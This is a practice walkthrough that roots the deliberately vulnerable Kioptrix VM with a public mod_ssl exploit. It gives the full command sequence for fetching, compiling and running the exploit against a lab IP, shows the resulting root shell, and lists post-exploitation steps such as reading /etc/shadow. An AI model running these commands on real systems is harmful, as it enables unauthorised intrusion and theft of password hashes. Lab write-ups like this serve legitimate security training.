# ðŸ¤˜ Manual Exploitation (Kioptrix)

## Manual Exploitation on Kioptrix Machine

In this walkthrough, we will explore the manual exploitation of the Kioptrix machine, a vulnerable virtual machine designed for practicing penetration testing skills. The objective is to gain root access on the target system using a known exploit related to mod\_ssl.

### 1. Identifying the Target

During reconnaissance, a GitHub repository named OpenLuck was identified. This repository contains an exploit for mod\_ssl versions lower than 2.8.7 OpenSSL. The GitHub repository can be found at [https://github.com/heltonWernik/OpenLuck](https://github.com/heltonWernik/OpenLuck).

### 2. Downloading OpenFuck.c

To initiate the exploitation process, the OpenFuck.c file from the OpenLuck GitHub repository needs to be downloaded. This is achieved using the `git clone` command:

```bash
git clone https://github.com/heltonWernik/OpenLuck.git
```

### 3. Installing the ssl-dev Library

The successful compilation of the exploit code requires the `libssl-dev` library. To install it, the following command is used:

```bash
apt-get install libssl-dev
```

### 4. Compiling OpenFuck.c

With the required library installed, the OpenFuck.c file is compiled using the `gcc` compiler:

```bash
gcc -o OpenFuck OpenFuck.c -lcrypto
```

### 5. Running the Exploit

The compiled exploit, named OpenFuck, is executed with the following command:

```bash
./OpenFuck
```

The usage of the exploit involves specifying the target, box (hostname or IP address), port for SSL connection, and an optional flag for opening a specific number of connections.

### 6. Selecting the Exploit for RedHat Linux 7.2

Since the target system is identified as RedHat Linux 7.2 with Apache version 1.3.20-16, the corresponding exploit is selected. In this case, it is `0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2`.

### 7. Executing the Exploit

The selected exploit is executed with the following command:

```bash
./OpenFuck 0x6b 192.168.179.129 -c 40
```

### 8. Successful Rooting

After running the exploit, a significant command response is received, indicating successful exploitation. The final output includes the execution of commands like `whoami` and `hostname`, confirming that root access has been gained on the Kioptrix machine manually.

```bash
ptrace-kmod.c:183:1: warning: no newline at the end of file
[+] Attached to 1946
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
whoami
root
hostname
kioptrix.level1
```

### Post-Exploitation Commands

After gaining a shell on the target system, certain post-exploitation commands are executed to gather valuable information:

1. **`ifconfig` and `ip a`:** Display network-related information to understand the network configuration of the compromised machine.
2. **`arp`:** View the ARP cache to identify other devices on the local network.
3. **`route`:** Show the routing table to understand network paths and potential points of interest.
4. **`sudo -l`:** List sudo privileges to identify commands and operations that can be performed with elevated privileges.
5. **`cat /etc/passwd` and `cat /etc/shadow`:** Display the contents of user account information and encrypted password hashes.
